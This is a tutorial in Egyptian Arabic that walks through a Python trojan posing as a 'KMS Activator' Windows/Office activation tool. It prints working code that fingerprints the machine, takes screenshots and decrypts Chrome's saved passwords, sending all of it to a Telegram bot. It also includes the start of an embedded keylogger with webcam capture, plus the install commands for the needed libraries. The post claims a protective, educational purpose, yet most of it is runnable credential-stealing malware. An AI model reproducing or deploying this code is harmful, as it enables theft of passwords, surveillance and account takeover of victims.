![Screenshot-2025-04-12-131058](https://i.postimg.cc/QMTw956X/Part-1.jpg)


### هاخد الكود خطوة خطوة وأشرحه بطريقة واضحة بأكتر تفصيل ممكن، زي ما اكون بفكّ البرنامج ده قدامك. هحاول أخلّي كل حاجة بسيطة ومفهومة، بس برضو هحافظ على إن الشرح يكون تعليمي بحيث تفهم إزاي الحاجات الخبيثة زي دي بتشتغل من غير ما ندعم أي استخدام غلط. الكود ده خطير وغير قانوني، وهدفنا هنا نفهم إزاي نحمي نفسنا منه. يلا نبدأ!

---

### الكود ده إيه بالأساس؟
الكود ده برنامج **خبيث** مكتوب بلغة بايثون، بيتظاهر إنه أداة "KMS Activator"، يعني برنامج المفروض يفعّل ويندوز أو أوفيس مجانًا. لكن الحقيقة إنه **فيروس** أو **تروجان**، هدفه يعمل حاجات زي:
- **يسرق كل اللي بتكتبه** على الكيبورد (زي الباسوردات، الرسايل، أي حاجة).
- **يسرق باسورداتك** من المتصفح زي جوجل كروم.
- **يصوّرك** بالكاميرا، **يسجّل صوتك**، و**يسجّل شاشتك**.
- **يفتح مواقع** أو **يطفّي الجهاز** لو حد بعتله أمر على تيليجرام.
- **يقفل جهازك** ويطلب منك كود عشان تفتحه، زي برامج الفدية.
- **يسرق صورك وملفاتك** ويبعتها لحد على تيليجرام.
- **يضمن إنه يفضل شغال** على جهازك كل ما تفتحه.

البرنامج معمول بشكل ذكي، يعني بيعمل واجهة زي البرامج العادية عشان تخلّيك تحس إنه موثوق، وبيشتغل في الخلفية من غير ما تلاحظ. كل حاجة بيسرقها بتروح على **تيليجرام** لشخص معين عنده **بوت** مبرمج مخصوص.

---

### المكتبات اللي بيستخدمها
الكود بيستخدم كومة مكتبات (Libraries) عشان يقدر يعمل كل الحاجات دي. خليني أشرح كل مكتبة بتعمل إيه:

```python
import platform, getpass, pyautogui, tkinter, customtkinter, subprocess, os, requests, cv2, tempfile, random, string, threading, time, pyperclip, webbrowser, winsound, win32gui, win32con, sounddevice, scipy.io.wavfile, PIL, datetime, io, sqlite3, win32crypt, shutil, ctypes, sys, json, base64, Crypto.Cipher, numpy, winreg
```

1. **platform**: بتعرف إنت بتستخدم ويندوز إصدار كام، إسم الجهاز إيه، والمعالج نوعه إيه.
2. **getpass**: بتجيب إسم المستخدم بتاعك في الويندوز.
3. **pyautogui**: بتتحكم في الماوس والكيبورد، يعني بتاخد سكرين شوت أو تكتب حاجة لوحدها.
4. **tkinter, customtkinter**: بيعملوا الواجهة اللي بتشوفها (النافذة اللي مكتوب عليها "KMS Activator").
5. **subprocess**: بتشغّل أوامر ويندوز زي ما تكون بتكتبها في الـ Command Prompt.
6. **os**: بتدخّل على ملفات الجهاز، تحذف، تنقل، أو تعرف المجلدات فين.
7. **requests**: بتبعت طلبات على الإنترنت، زي إنها تبعت بيانات لتيليجرام.
8. **cv2** (OpenCV): بتفتح الكاميرا عشان تصورك أو تسجّل الشاشة.
9. **tempfile**: بتعمل ملفات مؤقتة (زي صورة بتتصور وتتمسح بعدها).
10. **random, string**: بيعملوا حاجات عشوائية زي كود من 6 أرقام.
11. **threading**: بتشغّل أكتر من حاجة في نفس الوقت (زي إن الكود يسجّل صوت ويسرق باسورد في نفس اللحظة).
12. **time**: بتحسب الوقت، زي إن الكود يستنى 5 ثواني قبل ما يعمل حاجة.
13. **pyperclip**: بتشوف إيه اللي عملته كوبي (Copy) على جهازك.
14. **webbrowser**: بتفتح مواقع على المتصفح لو الكود عايز.
15. **winsound**: بتعمل أصوات، زي صوت بيب لو دخّلت كود غلط.
16. **win32gui, win32con**: بتتحكم في نوافذ الويندوز، زي إنها تخلّي شاشة القفل تكون فوق كل حاجة.
17. **sounddevice, scipy.io.wavfile**: بتسجّل الصوت من الميكروفون وتحفظه كملف WAV.
18. **PIL** (Pillow): بتعدّل على الصور، زي إنها تغيّر حجم صورة أو تفتح GIF.
19. **datetime**: بتجيب التاريخ والوقت، عشان الكود يقول مثلاً إمتى سرق البيانات.
20. **io**: بتتعامل مع البيانات زي الصور أو الملفات من غير ما تحتاج تحفظها.
21. **sqlite3**: بتفتح قواعد بيانات زي اللي فيها باسوردات كروم.
22. **win32crypt**: بتفك تشفير الباسوردات المحفوظة في الويندوز أو كروم.
23. **shutil**: بتنقل أو تنسخ ملفات من مكان لمكان.
24. **ctypes**: بتتحكم في حاجات الويندوز على مستوى أعمق.
25. **sys, json, base64, Crypto.Cipher**:
26. **numpy**:  بتساعد في التعامل مع البيانات المشفرة، زي فك باسوردات كروم.
27. **numpy**: بتساعد في معالجة الصور أو التسجيلات.




الكود زي سوبرمان، بيستخدم كل الأدوات دي عشان يعمل كل حاجة من سرقة لحد مراقبة!

---



 ### للتنزيلل

 ```bash
pip install pyautogui
pip install customtkinter
pip install requests
pip install opencv-python
pip install sounddevice
pip install scipy
pip install pillow
pip install pyperclip
pip install pycryptodome
pip install numpy
pip install pywin32
```

---
### إزاي بيشتغل مع تيليجرام؟
الكود بيستخدم **بوت تيليجرام** عشان يبعت البيانات اللي يسرقها ويستقبل أوامر. فيه بيانات زي دي:

```python
TELEGRAM_BOT_TOKEN = "حط هنا"
TELEGRAM_CHAT_ID = "قولت حط هناا"
UNLOCK_CODE = ''.join(random.choices(string.digits, k=6))
```

- **التوكن**: زي كلمة السر بتاعة البوت على تيليجرام. اللي عنده التوكن ده يقدر يتحكم في البوت.
- **الشات آي دي**: رقم الشات اللي بيتبعتله البيانات. يعني كل الصور والباسوردات بتروح للشخص اللي عنده الرقم ده.
- **كود الفتح**: رقم عشوائي من 6 أرقام، بيستخدمه لو قفل الجهاز (هنشرح ده بعدين).

الدوال اللي بتتعامل مع تيليجرام:
1. **`send_to_telegram(message)`**:
   - بيبعت رسالة نصية لتيليجرام، زي إنه يقول "سرقت الباسوردات دي".
   - لو فيه مشكلة (زي النت ضعيف)، بيحاول يكتب إنه فشل في الإرسال.
2. **`send_to_telegram_split(message)`**:
   - تيليجرام مابيسمحش برسالة أطول من 4096 حرف، فلو الرسالة طويلة (زي لستة باسوردات كتير)، بيقسمها لأجزاء ويبعت كل جزء لوحده.
3. **`send_photo_to_telegram(img_path)`**:
   - بيفتح صورة من الجهاز (زي سكرين شوت)، يبعتها لتيليجرام، ويمسح الصورة بعد كده.
4. **`send_video_to_telegram(video_path)`**:
   - بيبعت فيديو (زي تسجيل الشاشة) بنفس الطريقة.
5. **`send_audio_to_telegram(audio_path)`**:
   - بيبعت تسجيل صوتي (زي ملف WAV من الميكروفون).

يعني أي حاجة الكود بيسرقها (باسورد، صورة، فيديو)، بتروح على طول للشات ده من غير ما تحتاج تدخّل.

---

### الحاجات الخبيثة اللي بيعملها بالتفصيل

#### 1. **جمع معلومات أول ما يشتغل**
```python
def send_startup_info():
    username = getpass.getuser()
    os_info = platform.platform()
    cpu = platform.processor()
    device_name = platform.node()
    message = f"🖥️ جلسة جديدة بدأت\n👤 المستخدم: {username}\n💻 الجهاز: {device_name}\n🧠 المعالج: {cpu}\n🧾 نظام التشغيل: {os_info}"
    send_to_telegram_split(message)
    screenshot_path = os.path.join(tempfile.gettempdir(), "screenshot.jpg")
    pyautogui.screenshot().save(screenshot_path)
    send_photo_to_telegram(screenshot_path)
    os.remove(screenshot_path)
    extract_browser_credentials()
```

- **إيه اللي بيحصل؟**:
  - أول ما تفتح البرنامج، بيلمّع معلومات عنك وعن جهازك:
    - **إسم المستخدم**: بيستخدم `getpass.getuser()` عشان يعرف إسمك في الويندوز (زي "Ahmed" لو ده إسم حسابك).
    - **نظام التشغيل**: بيستخدم `platform.platform()` عشان يعرف إنت على ويندوز 10 ولا 11، وإصدار كام.
    - **المعالج**: بيستخدم `platform.processor()` عشان يعرف نوع المعالج (زي Intel i7 أو AMD Ryzen).
    - **إسم الجهاز**: بيستخدم `platform.node()` عشان يعرف إسم الكمبيوتر (زي "DESKTOP-12345").
  - بيحط المعلومات دي في رسالة مرتبة، زي:
    ```
    🖥️ جلسة جديدة بدأت
    👤 المستخدم: Ahmed
    💻 الجهاز: DESKTOP-12345
    🧠 المعالج: Intel Core i7
    🧾 نظام التشغيل: Windows-10-22H2
    ```
  - بيبعت الرسالة دي لتيليجرام باستخدام `send_to_telegram_split`.
  - بعد كده، بياخد **سكرين شوت** باستخدام `pyautogui.screenshot()`:
    - بيحفظ الصورة في مكان مؤقت (زي `C:\Users\Ahmed\AppData\Local\Temp\screenshot.jpg`).
    - بيبعت الصورة لتيليجرام.
    - بيمسح الصورة عشان ما تلاقيش أثر.
  - أخيرًا، بيروح ينفّذ دالة `extract_browser_credentials()` عشان يسرق باسوردات المتصفح (هنشرحها بعدين).
- **ليه خطير؟**:
  - اللي بيستلم الرسالة دي بيعرف إنت مين، جهازك إيه، وإيه اللي مفتوح على الشاشة. لو كنت فاتح إيميلك أو حاجة مهمة، هيشوفها.
  - ده زي ما تكون بدّيت حد صورة كاملة عن جهازك من أول دقيقة.

---

#### 2. **سرقة باسوردات المتصفح**
```python
def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    if not os.path.exists(local_state_path):
        send_to_telegram_split("⚠️ ملف 'Local State' غير موجود. تأكد من تثبيت Chrome.")
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]  # Remove 'DPAPI'
        decrypted_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        return decrypted_key
    except Exception as e:
        send_to_telegram_split(f"⚠️ فشل في فك تشفير مفتاح التشفير من 'Local State': {str(e)}")
        return None

def decrypt_password(password, key):
    try:
        if not password.startswith(b'v10') and not password.startswith(b'v11'):
            return win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode('utf-8')
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt(password)[:-16].decode()
        return decrypted
    except Exception as e:
        return f"[فشل فك التشفير: {str(e)}]"

def extract_browser_credentials():
    try:
        chrome_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
        if not os.path.exists(chrome_path):
            send_to_telegram_split("⚠️ ملف 'Login Data' غير موجود في مسار Chrome. تأكد من تثبيت Chrome وتسجيل الدخول.")
            return
        temp_db = os.path.join(tempfile.gettempdir(), "Login_Data_temp")
        shutil.copy2(chrome_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        rows = cursor.fetchall()
        encryption_key = get_encryption_key()
        if not encryption_key:
            send_to_telegram_split("⚠️ تعذر استخراج مفتاح التشفير. شغّل الكود كمستخدم عادي.")
            conn.close()
            os.remove(temp_db)
            return
        credentials = []
        for row in rows:
            url, username, encrypted_password = row
            if username and encrypted_password:
                password = decrypt_password(encrypted_password, encryption_key)
                credentials.append(f"🌐 الموقع: {url}\n👤 الإيميل/اسم المستخدم: {username}\n🔒 كلمة المرور: {password}")
            else:
                credentials.append(f"🌐 الموقع: {url}\n👤 الإيميل/اسم المستخدم: {username or '[غير متوفر]'}\n🔒 كلمة المرور: [غير متوفرة]")
        conn.close()
        os.remove(temp_db)
        if credentials:
            message = "📋 بيانات تسجيل الدخول من Chrome:\n\n" + "\n\n".join(credentials)
            send_to_telegram_split(message)
        else:
            send_to_telegram_split("⚠️ لم يتم العثور على بيانات صالحة لتسجيل الدخول في Chrome.")
    except Exception as e:
        send_to_telegram_split(f"⚠️ خطأ عام أثناء استخراج بيانات المتصفح: {str(e)}")
        if os.path.exists(temp_db):
            os.remove(temp_db)
```

- **إيه اللي بيحصل؟**:
  ### الكود بيسرق الباسوردات إزاي؟
الكود بيستهدف الباسوردات المحفوظة في جوجل كروم، يعني لو عندك باسوردات زي إيميلك، فيسبوك، أو حتى حساب البنك محفوظة في كروم (لما بيطلع مربع "حفظ كلمة المرور؟" وإنت بتقول آه)، الكود ده بيروح يجيبها. الباسوردات دي مش مكتوبة كده على طول في الكمبيوتر، لأن كروم بيشفّرها (يعني بيحوّلها لكلام مش مفهوم) عشان يحميها. الكود بيعرف يفك التشفير ده باستخدام 3 دوال رئيسية
    1. **`get_encryption_key()`**:
       - بيفتح ملف إسمه `Local State` في مجلد كروم (`C:\Users\Ahmed\AppData\Local\Google\Chrome\User Data\Local State`).
       - الملف ده فيه مفتاح مشفر بيستخدمه كروم عشان يحمي الباسوردات.
       - بياخد المفتاح ده، يفك تشفيره باستخدام `win32crypt.CryptUnprotectData` (دي مكتبة بتستخدم حاجات ويندوز عشان تفك التشفير).
       - لو نجح، بيرجّع المفتاح. لو فشل (زي لو كروم مش موجود)، بيبعت رسالة خطأ لتيليجرام.
    2. **`decrypt_password(password, key)`**:
       - بياخد الباسورد المشفر من كروم ويحاول يفكّه بالمفتاح اللي جابه.
       - لو الباسورد قديم (مش بيبدأ بـ `v10` أو `v11`)، بيستخدم طريقة تشفير قديمة (`win32crypt`).
       - لو باسورد جديد، بيستخدم تشفير AES-GCM (بياخد جزء من الباسورد إسمه IV وباقي البيانات، ويفكّهم).
       - لو نجح، بيرجّع الباسورد كتكست عادي (زي "MyPass123"). لو فشل، بيرجّع رسالة خطأ.
    3. **`extract_browser_credentials()`**:
       - بيفتح ملف إسمه `Login Data` في مجلد كروم (`C:\Users\Ahmed\AppData\Local\Google\Chrome\User Data\Default\Login Data`).
       - الملف ده زي قاعدة بيانات فيها كل الباسوردات المحفوظة.
       - بيعمل نسخة مؤقتة من الملف ده في مجلد الـ Temp عشان ما يغيّرش الأصلي.
       - بيفتح النسخة دي زي قاعدة بيانات باستخدام `sqlite3`.
       - بيطلّع كل السجلات اللي فيها مواقع (زي `https://facebook.com`)، إيميلات أو أسماء مستخدمين، والباسوردات المشفرة.
       - بيستخدم المفتاح من `get_encryption_key` عشان يفك تشفير كل باسورد.
       - بيحط كل حاجة في لستة، زي:
         ```
         🌐 الموقع: https://facebook.com
         👤 الإيميل/اسم المستخدم: ahmed@example.com
         🔒 كلمة المرور: MyPass123
         ```
       - لو ما لقاش بيانات، بيبعت رسالة لتيليجرام يقول إنه ما لقاش حاجة.
       - بيبعت اللستة دي كلها لتيليجرام في رسالة واحدة.
       - أخيرًا، بيمسح النسخة المؤقتة عشان ما يسيبش أثر.
- **ليه خطير؟**:
  - لو بتحفظ باسورداتك في كروم (زي معظم الناس)، الكود ده هيسرق كل حاجة، من إيميلك للبنك.
  - اللي بيستلم الباسوردات دي يقدر يدخل على حساباتك ويسرق فلوسك أو بياناتك.
طيب، هشرحلك بالعامية المصرية وبطريقة واضحة جدًا إزاي الكود ده بيفك تشفير كلمات المرور (الباسوردات) المحفوظة في جوجل كروم، خطوة خطوة، زي ما أكون بفكّ القفل قدامك. الهدف هنا تعليمي بحت، عشان تفهم إزاي الحاجات الخبيثة زي دي بتشتغل وتقدر تحمي نفسك، مش عشان تستخدمها لأن ده غير قانوني وخطير. يلا نبدأ!

---

### 1. **دالة `get_encryption_key()`: جيب المفتاح بتاع التشفير**
```python
def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    if not os.path.exists(local_state_path):
        send_to_telegram_split("⚠️ ملف 'Local State' غير موجود. تأكد من تثبيت Chrome.")
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]  # Remove 'DPAPI'
        decrypted_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        return decrypted_key
    except Exception as e:
        send_to_telegram_split(f"⚠️ فشل في فك تشفير مفتاح التشفير من 'Local State': {str(e)}")
        return None
```

- **إيه اللي بيحصل هنا؟**:
  - كروم بيحفظ الباسوردات مشفرة، ومفتاح التشفير (اللي زي كلمة السر بتاع القفل) موجود في ملف إسمه `Local State`.
  - **الخطوة الأولى**: الكود بيروح يدور على الملف ده في مكانه اللي هو:
    ```
    C:\Users\إسمك\AppData\Local\Google\Chrome\User Data\Local State
    ```
    - لو ما لقاش الملف (يعني كروم مش متثبت أو الملف مش موجود)، بيبعت رسالة لتيليجرام يقول "ملف Local State مش موجود" ويخلّص.
  - **الخطوة التانية**: لو لقى الملف، بيفتحه وبيقراه زي ملف JSON (ده نوع ملفات بيحفظ بيانات زي القواميس).
    - الملف ده فيه حاجة إسمها `"os_crypt"`، وجواها `"encrypted_key"`.
    - الـ `encrypted_key` ده هو مفتاح التشفير، بس هو نفسه مشفر (يعني زي قفل جوا قفل).
  - **الخطوة التالتة**: بياخد المفتاح المشفر ده وبيحوّله من صيغة Base64 (دي طريقة بتحوّل البيانات لكلام غريب زي `A1B2C3`) لصيغة عادية باستخدام `base64.b64decode`.
    - بعد ما يفك الـ Base64، بيطلّع أول 5 حروف (اللي هما `DPAPI`) لأن دول جزء من التشفير بتاع ويندوز.
  - **الخطوة الرابعة**: بيستخدم مكتبة `win32crypt`، وبالأخص دالة `CryptUnprotectData`، عشان يفك تشفير المفتاح.
    - الدالة دي بتستخدم نظام حماية ويندوز (DPAPI) عشان تفك المفتاح.
    - ليه ويندوز بيساعد هنا؟ لأن المفتاح مشفر بناءً على حساب المستخدم بتاعك في الويندوز، فالكود لو شغال بنفس الحساب، بيقدر يفكّه.
    - الدالة بترجّع المفتاح كتكست عادي (زي سلسلة من الأرقام والحروف).
  - **الخطوة الأخيرة**: لو كل حاجة تمام، بيرجّع المفتاح ده. لو حصل أي خطأ (زي إن الملف معطوب أو ما قدرش يفك التشفير)، بيبعت رسالة لتيليجرام يقول إنه فشل ويرجّع `None`.

- **زي إيه بالظبط؟**:
  - فكر إن الباسوردات زي كنز في صندوق مقفول. المفتاح بتاع الصندوق ده مخبّى في ورقة مكتوب عليها كلام مش مفهوم (الـ `Local State`). الكود بيروح يلاقي الورقة، يفك الكلام الغريب، وبيطلّع المفتاح الحقيقي.

- **ليه خطير؟**:
  - من غير المفتاح ده، الباسوردات مالهاش معنى لأنها مشفرة. بس لما الكود يجيب المفتاح، يقدر يفتح كل الأقفال ويطلّع الباسوردات.

---

### 2. **دالة `decrypt_password()`: فك تشفير الباسورد**
```python
def decrypt_password(password, key):
    try:
        if not password.startswith(b'v10') and not password.startswith(b'v11'):
            return win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode('utf-8')
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt(password)[:-16].decode()
        return decrypted
    except Exception as e:
        return f"[فشل فك التشفير: {str(e)}]"
```

- **إيه اللي بيحصل هنا؟**:
  - الدالة دي بتاخد باسورد مشفر (زي كلام غريب زي `v10abc123xyz`) والمفتاح اللي جبناه من `get_encryption_key()`، وبتحاول تفك التشفير عشان تطلّع الباسورد الحقيقي (زي `MyPass123`).
  - كروم بيستخدم طريقتين تشفير مختلفتين بناءً على إصدار المتصفح:
    1. **تشفير قديم** (قبل إصدارات كروم 80 تقريبًا).
    2. **تشفير جديد** (من إصدار 80 وطالع، بيستخدم AES-GCM).
  - **الخطوة الأولى**: بيشوف الباسورد المشفر بيبدأ بـ `v10` أو `v11` ولا لأ:
    - لو مش بيبدأ بـ `v10` أو `v11`، يعني الباسورد مشفر بطريقة قديمة:
      - بيستخدم `win32crypt.CryptUnprotectData` عشان يفك التشفير.
      - الدالة دي بتستخدم نظام ويندوز (DPAPI) عشان تطلّع الباسورد كتكست عادي.
      - بيحوّل الباسورد من بايتس (زي `b'MyPass123'`) لنص عادي (زي `MyPass123`) باستخدام `decode('utf-8')`.
    - لو بيبدأ بـ `v10` أو `v11`، يعني الباسورد مشفر بطريقة جديدة (AES-GCM):
      - الباسورد المشفر بيكون مكوّن من 3 أجزاء:
        1. أول 3 بايتس (`v10` أو `v11`) بيحددوا إصدار التشفير.
        2. الـ 12 بايت اللي بعدهم (من 3 لـ 15) إسمهم `iv` (Initialization Vector)، وده زي مفتاح إضافي بيستخدمه التشفير.
        3. باقي البيانات (من 15 للآخر) هي الباسورد المشفر نفسه.
      - الكود بياخد الـ `iv` (من بايت 3 لـ 15) والباسورد المشفر (من بايت 15 للآخر).
      - بيستخدم مكتبة `Crypto.Cipher` وبالأخص `AES.new` عشان يعمل كائن تشفير باستخدام:
        - المفتاح اللي جابه من `get_encryption_key()`.
        - وضع التشفير `AES.MODE_GCM` (ده نوع تشفير قوي).
        - الـ `iv` اللي طلّعه من الباسورد.
      - بيستخدم الكائن ده عشان يفك تشفير الباسورد باستخدام `cipher.decrypt`.
      - بيمسح آخر 16 بايت من الناتج لأن دول بيكونوا `authentication tag` (حاجة بتستخدمها AES-GCM عشان تتأكد إن البيانات سليمة).
      - بيحوّل الناتج لتكست عادي باستخدام `decode()`.
  - **الخطوة الأخيرة**: لو كل حاجة تمام، بيرجّع الباسورد (زي `MyPass123`). لو حصل أي خطأ (زي إن المفتاح غلط أو الباسورد معطوب)، بيرجّع رسالة خطأ زي `[فشل فك التشفير: ...]`.

- **زي إيه بالظبط؟**:
  - فكر إن الباسورد زي رسالة سرية مكتوبة بحبر سحري. الدالة دي زي واحد عنده العصاية السحرية (المفتاح) وبيعرف يحوّل الكلام الغريب لرسالة مفهومة.
  - بس العصاية دي بتشتغل بطريقتين: طريقة قديمة (زي فتح قفل بالمفتاح) وطريقة جديدة (زي فتح قفل إلكتروني بكود ومفتاح مع بعض).

- **ليه خطير؟**:
  - الدالة دي هي اللي بتحوّل الباسوردات من كلام مش مفهوم لكلام حقيقي. يعني من غيرها، الباسوردات مالهاش قيمة، بس لما تشتغل، بتدّي اللي بيستخدم الكود كل باسورداتك.

---

### 3. **دالة `extract_browser_credentials()`: اجمع الباسوردات كلها**
```python
def extract_browser_credentials():
    try:
        chrome_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
        if not os.path.exists(chrome_path):
            send_to_telegram_split("⚠️ ملف 'Login Data' غير موجود في مسار Chrome. تأكد من تثبيت Chrome وتسجيل الدخول.")
            return
        temp_db = os.path.join(tempfile.gettempdir(), "Login_Data_temp")
        shutil.copy2(chrome_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        rows = cursor.fetchall()
        encryption_key = get_encryption_key()
        if not encryption_key:
            send_to_telegram_split("⚠️ تعذر استخراج مفتاح التشفير. شغّل الكود كمستخدم عادي.")
            conn.close()
            os.remove(temp_db)
            return
        credentials = []
        for row in rows:
            url, username, encrypted_password = row
            if username and encrypted_password:
                password = decrypt_password(encrypted_password, encryption_key)
                credentials.append(f"🌐 الموقع: {url}\n👤 الإيميل/اسم المستخدم: {username}\n🔒 كلمة المرور: {password}")
            else:
                credentials.append(f"🌐 الموقع: {url}\n👤 الإيميل/اسم المستخدم: {username or '[غير متوفر]'}\n🔒 كلمة المرور: [غير متوفرة]")
        conn.close()
        os.remove(temp_db)
        if credentials:
            message = "📋 بيانات تسجيل الدخول من Chrome:\n\n" + "\n\n".join(credentials)
            send_to_telegram_split(message)
        else:
            send_to_telegram_split("⚠️ لم يتم العثور على بيانات صالحة لتسجيل الدخول في Chrome.")
    except Exception as e:
        send_to_telegram_split(f"⚠️ خطأ عام أثناء استخراج بيانات المتصفح: {str(e)}")
        if os.path.exists(temp_db):
            os.remove(temp_db)
```

- **إيه اللي بيحصل هنا؟**:
  - الدالة دي هي اللي بتجمع كل حاجة مع بعض. بتدخل على مكان الباسوردات في كروم، تجيبها، وتفك تشفيرها.
  - **الخطوة الأولى**: بيروح يدور على ملف إسمه `Login Data` في:
    ```
    C:\Users\إسمك\AppData\Local\Google\Chrome\User Data\Default\Login Data
    ```
    - الملف ده زي قاعدة بيانات (SQLite) فيها كل الباسوردات المحفوظة.
    - لو ما لقاش الملف، بيبعت رسالة لتيليجرام يقول "ملف Login Data مش موجود" ويخلّص.
  - **الخطوة التانية**: بيعمل نسخة مؤقتة من الملف ده في الـ Temp (مكان زي `C:\Users\إسمك\AppData\Local\Temp\Login_Data_temp`) باستخدام `shutil.copy2`.
    - بيعمل نسخة عشان ما يغيّرش الملف الأصلي وما يسيبش أثر.
  - **الخطوة التالتة**: بيفتح النسخة المؤقتة دي زي قاعدة بيانات باستخدام `sqlite3`.
    - بيستخدم أمر SQL زي:
      ```sql
      SELECT origin_url, username_value, password_value FROM logins
      ```
      - اللي بيجيب:
        - `origin_url`: رابط الموقع (زي `https://facebook.com`).
        - `username_value`: الإيميل أو اسم المستخدم (زي `ahmed@example.com`).
        - `password_value`: الباسورد المشفر (زي `v10abc123xyz`).
  - **الخطوة الرابعة**: بيجيب مفتاح التشفير باستخدام `get_encryption_key()`.
    - لو ما قدرش يجيب المفتاح، بيبعت رسالة لتيليجرام يقول "تعذر استخراج مفتاح التشفير"، يقفل القاعدة، يمسح الملف المؤقت، ويخلّص.
  - **الخطوة الخامسة**: بيمر على كل سجل في القاعدة:
    - لو فيه إيميل وباسورد مشفر، بيستخدم `decrypt_password(encrypted_password, encryption_key)` عشان يفك الباسورد.
    - بيحط الموقع، الإيميل، والباسورد في لستة، زي:
      ```
      🌐 الموقع: https://facebook.com
      👤 الإيميل/اسم المستخدم: ahmed@example.com
      🔒 كلمة المرور: MyPass123
      ```
    - لو مافيش إيميل أو باسورد، بيحط "[غير متوفر]" عشان الرسالة تبقى مرتبة.
  - **الخطوة السادسة**: بيقفل قاعدة البيانات وبيمسح الملف المؤقت.
  - **الخطوة الأخيرة**: لو لقى باسوردات، بيحطهم في رسالة كبيرة (كل باسورد منفصل عن التاني بمسافة) وبيبعتها لتيليجرام باستخدام `send_to_telegram_split`.
    - لو ما لقاش ولا باسورد، بيبعت رسالة يقول "لم يتم العثور على بيانات صالحة".
    - لو حصل أي خطأ في أي خطوة، بيبعت رسالة يقول إيه المشكلة ويمسح الملف المؤقت لو لسه موجود.

- **زي إيه بالظبط؟**:
  - الدالة دي زي واحد بيروح المكتبة (ملف `Login Data`)، بياخد كتاب فيه كل الأسرار (الباسوردات المشفرة)، بيستخدم مفتاح سحري (`encryption_key`) عشان يقرا الأسرار، وبيبعت الكتاب كله لحد على تيليجرام.

- **ليه خطير؟**:
  - الدالة دي هي اللي بتجمع كل الباسوردات وتبعتها. يعني لو عندك 50 باسورد محفوظ في كروم، هيروحوا كلهم في رسالة واحدة للشخص اللي على تيليجرام.

---

### الخلاصة: إزاي بيشتغل مع بعض؟
1. **جيب المفتاح**:
   - الكود بيروح لملف `Local State`، ياخد المفتاح المشفر، يفكّه باستخدام ويندوز، ويطلّع مفتاح التشفير.
2. **افتح قاعدة البيانات**:
   - بيروح لملف `Login Data`، ينسخه، يفتحه، ويطلّع كل المواقع، الإيميلات، والباسوردات المشفرة.
3. **فك الباسوردات**:
   - بياخد كل باسورد مشفر، يستخدم المفتاح عشان يفكّه، سواء بطريقة قديمة (DPAPI) أو جديدة (AES-GCM).
4. **ابعت كل حاجة**:
   - بيحط كل البيانات في رسالة مرتبة (موقع، إيميل، باسورد) وبيبعتها لتيليجرام.

---

### ليه الكود ناجح في فك التشفير؟
- **لأن ويندوز بيساعده**: المفتاح مشفر بناءً على حساب المستخدم بتاعك، فالكود لو شغال بنفس الحساب، بيقدر يستخدم ويندوز عشان يفكّه.
- **لأن كروم بيحفظ المفتاح في مكان معروف**: ملف `Local State` مش مخفي كويس، فالكود بيلاقيه بسهولة.
- **لأنه بيستخدم مكتبات قوية**: زي `win32crypt` و`Crypto.Cipher` اللي بتعرف تفك أي تشفير لو عندها المفتاح.

---

#### 3. **زرع الكيلوجر (تسجيل الكيبورد)**
```python
keylogger_script = (
    'import keyboard\n'
    'import time\n'
    'import requests\n'
    'import cv2\n'
    'import os\n'
    'import tempfile\n\n'
    f'TELEGRAM_BOT_TOKEN = "{TELEGRAM_BOT_TOKEN}"\n'
    f'TELEGRAM_CHAT_ID = "{TELEGRAM_CHAT_ID}"\n'
    f'DEVICE_NAME = "{device_name}"\n'
    'logged_keys = ""\n'
    'LOG_FILE = os.path.join(tempfile.gettempdir(), "keylog.txt")\n\n'
    'def log_to_file(message):\n'
    '    with open(LOG_FILE, "a", encoding="utf-8") as f:\n'
    '        f.write(f"[{time.ctime()}] {message}\\n")\n\n'
    'def send_to_telegram(message):\n'
    '    url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage"\n'
    '    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message}\n'
    '    try:\n'
    '        response = requests.post(url, data=data)\n'
    '        if response.status_code == 200:\n'
    '            log_to_file(f"تم إرسال الرسالة: {message}")\n'
    '        else:\n'
    '            log_to_file(f"فشل الإرسال: HTTP {response.status_code}")\n'
    '    except Exception as e:\n'
    '        log_to_file(f"خطأ في الإرسال: {str(e)}")\n\n'
    'def send_photo_to_telegram(img_path):\n'
    '    try:\n'
    '        with open(img_path, "rb") as f:\n'
    '            url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendPhoto"\n'
    '            response = requests.post(url, files={"photo": f}, data={"chat_id": TELEGRAM_CHAT_ID})\n'
    '            if response.status_code == 200:\n'
    '                log_to_file(f"تم إرسال الصورة: {img_path}")\n'
    '            else:\n'
    '                log_to_file(f"فشل إرسال الصورة: HTTP {response.status_code}")\n'
    '    except Exception as e:\n'
    '        log_to_file(f"خطأ في إرسال الصورة: {str(e)}")\n\n'
    'def capture_camera():\n'
    '    try:\n'
    '        cap = cv2.VideoCapture(0)\n'
    '        ret, frame = cap.read()\n'
    '        if ret:\n'
    '            img_path = os.path.join(tempfile.gettempdir(), "keylogger_capture.jpg")\n'
    '            cv2.imwrite(img_path, frame)\n'
